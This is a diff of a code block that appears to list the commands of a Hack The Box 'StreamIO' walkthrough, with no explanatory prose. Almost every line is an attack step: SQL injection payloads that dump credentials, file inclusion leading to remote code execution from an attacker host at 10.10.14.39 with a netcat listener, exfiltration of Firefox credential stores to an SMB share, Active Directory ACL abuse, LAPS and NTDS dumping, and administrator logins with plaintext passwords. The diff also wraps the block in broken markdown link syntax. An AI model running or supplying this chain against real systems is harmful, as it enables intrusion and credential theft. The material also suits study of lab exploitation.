@@ -1,5 +1,5 @@
 ```
-https://watch.streamio.htb/
+[https://watch.streamio.htb/
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
 https://watch.streamio.htb/search.php
 10' union select 1,2,3,4,5,6 -- -
@@ -28,6 +28,68 @@ Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
 net group 'CORE STAFF'
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
 evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
+](http://streamio.htb/
+http://watch.streamio.htb/
+https://streamio.htb/
+https://watch.streamio.htb/
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
+https://watch.streamio.htb/search.php
+https://book.hacktricks.xyz/pentesting-web/sql-injection
+1' and 1=1 -- | 1' and 1=2 --
+10' union select 1,2,3,4,5,6 -- -
+10' union select 1,@@version,3,4,5,6 -- -
+10' union select 1,(select DB_NAME()),3,4,5,6 -- -
+10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
+https://crackstation.net/
+https://streamio.htb/login.php
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -fs 1678
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
+https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
+echo "PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpL[SNIIIIIP]Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==" | base64 -d > master.php
+system("dir C:\\");
+https://streamio.htb/admin/?debug=master.php
+Content-Type: application/x-www-form-urlencoded
+include=http://10.10.14.39/rce.php
+rlwrap -cAr nc -lnvp 443
+$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h’);
+dir -recurse *.php | select-string -pattern "database"
+where.exe sqlcmd
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;“
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
+hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user
+crackmapexec smb 10.10.11.158 -u users2.txt -p pass2.txt --continue-on-success --no-bruteforce
+crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
+evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
+upload winPEASx64.exe
+./winPEASx64.exe
+./smbserver.py s . -smb2support -username df -password df
+cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.default-release
+net use \\10.10.14.39\s /u:df df
+copy key4.db \\10.10.14.39\s\key4.db
+copy logins.json \\10.10.14.39\s\logins.json
+git clone https://github.com/lclevy/firepwd.git
+python3 firepwd.py
+crackmapexec smb 10.10.11.158 -u users3.txt -p pass3.txt
+crackmapexec winrm 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
+git clone https://github.com/fox-it/BloodHound.py.git
+cd BloodHound.py
+python3 setup.py install
+python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+upload PowerView.ps1
+. .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
+Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
+Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
+Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
+net group 'CORE STAFF'
+Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
+crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
+evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
+crackmapexec smb 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
+crackmapexec winrm 10.10.11.158 -u administrator -p '228QE(T)7tr[Md’
+evil-winrm -i 10.10.11.158 -u administrator -p '228QE(T)7tr[Md')
 ```
 
 
